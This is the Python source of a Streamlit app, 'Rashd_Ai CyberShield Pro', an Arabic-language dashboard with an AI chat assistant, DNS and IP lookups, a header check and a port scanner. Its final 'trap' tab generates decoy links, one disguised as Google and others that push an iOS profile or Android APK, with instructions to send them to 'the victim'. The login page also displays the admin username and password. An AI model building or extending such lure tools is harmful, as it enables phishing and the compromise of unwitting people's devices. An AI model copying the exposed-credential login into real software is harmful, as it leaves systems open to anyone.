"""
تطبيق Rashd_Ai - منصة الذكاء الاستخباراتي والأمن السيبراني
نسخة مبسطة وسريعة - بدون مشاكل توافقية
"""

import streamlit as st
import requests
import json
import os
from datetime import datetime
import config
import logging

# إعداد السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= إعدادات الصفحة =============
st.set_page_config(
    page_title="Rashd_Ai - CyberShield Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# تطبيق أسلوب مخصص
st.markdown("""
<style>
    .main {
        padding: 20px;
    }
    
    .stButton > button {
        width: 100%;
        border-radius: 5px;
        font-weight: bold;
    }
</style>
""", unsafe_allow_html=True)

# ============= نظام المصادقة =============
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("<h1 style='text-align: center;'>🛡️ تسجيل الدخول</h1>", unsafe_allow_html=True)
        st.markdown("<h3 style='text-align: center;'>Rashd_Ai - CyberShield Pro</h3>", unsafe_allow_html=True)
        
        with st.form("login_form"):
            user = st.text_input("اسم المستخدم", placeholder="أدخل اسم المستخدم")
            pw = st.text_input("كلمة المرور", type="password", placeholder="أدخل كلمة المرور")
            
            col_btn1, col_btn2 = st.columns(2)
            with col_btn1:
                if st.form_submit_button("🔓 دخول", use_container_width=True):
                    if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                        st.session_state.authenticated = True
                        st.rerun()
                    else:
                        st.error("❌ بيانات خاطئة. حاول مرة أخرى.")
            
            with col_btn2:
                st.info("👤 اسم المستخدم: Rashd919\n🔑 كلمة المرور: 112233")
    
    st.stop()

# ============= الواجهة الرئيسية =============
col1, col2, col3 = st.columns([1, 3, 1])
with col2:
    st.markdown("<h1 style='text-align: center;'>🛡️ منصة CyberShield Pro</h1>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align: center;'>للذكاء الاستخباراتي و OSINT</h3>", unsafe_allow_html=True)

# الشريط الجانبي
with st.sidebar:
    st.header("⚙️ الإعدادات")
    
    with st.expander("🔑 مفاتيح API", expanded=False):
        groq_api_key = st.text_input(
            "GROQ API Key",
            value=config.get_key("GROQ_API_KEY") or "",
            type="password",
            key="sidebar_groq"
        )
        telegram_bot_token = st.text_input(
            "Telegram Bot Token",
            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
            type="password",
            key="sidebar_telegram_token"
        )
        telegram_chat_id = st.text_input(
            "Telegram Chat ID",
            value=config.get_key("TELEGRAM_CHAT_ID") or "",
            key="sidebar_telegram_chat_id"
        )
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("💾 حفظ الإعدادات", use_container_width=True, key="save_settings_btn"):
                config.set_key("GROQ_API_KEY", groq_api_key)
                config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                st.success("✅ تم الحفظ بنجاح!")
        
        with col2:
            if st.button("🔄 إعادة تعيين", use_container_width=True, key="reset_settings_btn"):
                config.set_key("GROQ_API_KEY", "")
                config.set_key("TELEGRAM_BOT_TOKEN", "")
                config.set_key("TELEGRAM_CHAT_ID", "")
                st.info("⚠️ تم إعادة التعيين")
    
    st.divider()
    
    if st.button("🚪 تسجيل الخروج", use_container_width=True, key="logout_btn"):
        st.session_state.authenticated = False
        st.rerun()

# ============= التبويبات =============
tab_names = [
    "💬 المحادثة",
    "🌐 تحليل الدومين",
    "🔍 فحص المواقع",
    "📍 تحديد الموقع",
    "🔌 Port Scanner",
    "📄 التقارير",
    "🎯 المصيدة"
]

tabs = st.tabs(tab_names)

# ============= التبويب 0: المحادثة =============
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    
    if "messages" not in st.session_state:
        st.session_state.messages = []
    
    # عرض السجل
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    
    # إدخال المستخدم
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        
        with st.chat_message("assistant"):
            try:
                from groq import Groq
                groq_key = config.get_key("GROQ_API_KEY")
                if not groq_key:
                    response = "⚠️ خطأ: GROQ_API_KEY غير موجود."
                else:
                    client = Groq(api_key=groq_key)
                    chat_completion = client.chat.completions.create(
                        messages=[
                            {"role": "system", "content": "أنت Rashd_Ai، مساعد ذكي متخصص في الأمن السيبراني. إجاباتك دائماً باللغة العربية، احترافية، ومختصرة."},
                            {"role": "user", "content": prompt}
                        ],
                        model="mixtral-8x7b-32768",
                        temperature=0.7,
                        max_tokens=1000
                    )
                    response = chat_completion.choices[0].message.content
            except Exception as e:
                response = f"❌ حدث خطأ: {str(e)}"
            
            st.markdown(response)
        
        st.session_state.messages.append({"role": "assistant", "content": response})

# ============= التبويب 1: تحليل الدومين =============
with tabs[1]:
    st.header("🌐 تحليل الدومين")
    
    domain = st.text_input("أدخل الدومين:", placeholder="example.com")
    
    if st.button("🔍 تحليل", use_container_width=True):
        if domain:
            st.info(f"جاري تحليل: {domain}")
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, 'A')
                st.success("✅ تم الحصول على النتائج:")
                for rdata in answers:
                    st.write(f"IP: {rdata}")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")
        else:
            st.warning("⚠️ يرجى إدخال دومين")

# ============= التبويب 2: فحص المواقع =============
with tabs[2]:
    st.header("🔍 فحص المواقع")
    
    url = st.text_input("أدخل الرابط:", placeholder="https://example.com")
    
    if st.button("🔍 فحص", use_container_width=True):
        if url:
            st.info(f"جاري فحص: {url}")
            try:
                response = requests.head(url, timeout=5)
                st.success(f"✅ حالة الاتصال: {response.status_code}")
                st.write(f"الرؤوس: {dict(response.headers)}")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")
        else:
            st.warning("⚠️ يرجى إدخال رابط")

# ============= التبويب 3: تحديد الموقع =============
with tabs[3]:
    st.header("📍 تحديد الموقع")
    
    ip = st.text_input("أدخل عنوان IP:", placeholder="8.8.8.8")
    
    if st.button("📍 تحديد", use_container_width=True):
        if ip:
            st.info(f"جاري تحديد موقع: {ip}")
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                data = response.json()
                st.success("✅ تم الحصول على البيانات:")
                st.json(data)
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")
        else:
            st.warning("⚠️ يرجى إدخال عنوان IP")

# ============= التبويب 4: Port Scanner =============
with tabs[4]:
    st.header("🔌 Port Scanner")
    
    host = st.text_input("أدخل المضيف:", placeholder="example.com")
    port_range = st.text_input("نطاق المنافذ:", placeholder="80,443,8080", value="80,443")
    
    if st.button("🔌 مسح", use_container_width=True):
        if host:
            st.info(f"جاري مسح المنافذ: {host}")
            try:
                import socket
                ports = [int(p.strip()) for p in port_range.split(",")]
                open_ports = []
                
                progress_bar = st.progress(0)
                for i, port in enumerate(ports):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((host, port))
                        if result == 0:
                            open_ports.append(port)
                        sock.close()
                    except:
                        pass
                    
                    progress_bar.progress((i + 1) / len(ports))
                
                if open_ports:
                    st.success(f"✅ المنافذ المفتوحة: {open_ports}")
                else:
                    st.warning("⚠️ لم يتم العثور على منافذ مفتوحة")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")
        else:
            st.warning("⚠️ يرجى إدخال المضيف")

# ============= التبويب 5: التقارير =============
with tabs[5]:
    st.header("📄 التقارير")
    
    st.info("قريباً: نظام التقارير المتقدم")

# ============= التبويب 6: المصيدة =============
with tabs[6]:
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
    
    decoy_type = st.selectbox(
        "اختر نوع المصيدة:",
        ["Google Decoy", "Download (iOS)", "Download (Android)"],
        key="decoy_type_select"
    )
    
    app_url = "https://rashdai.streamlit.app"
    
    if decoy_type == "Google Decoy":
        decoy_url = f"{app_url}/?decoy=google"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
    
    elif decoy_type == "Download (iOS)":
        decoy_url = f"{app_url}/?download=true&device=ios"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
    
    elif decoy_type == "Download (Android)":
        decoy_url = f"{app_url}/?download=true&device=android"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")

# ============= التذييل =============
st.divider()
st.markdown("""
<div style='text-align: center; padding: 20px; color: #888;'>
    <p>🛡️ <strong>Rashd_Ai Pro</strong> © 2026</p>
    <p>منصة الذكاء الاستخباراتي والأمن السيبراني</p>
</div>
""", unsafe_allow_html=True)
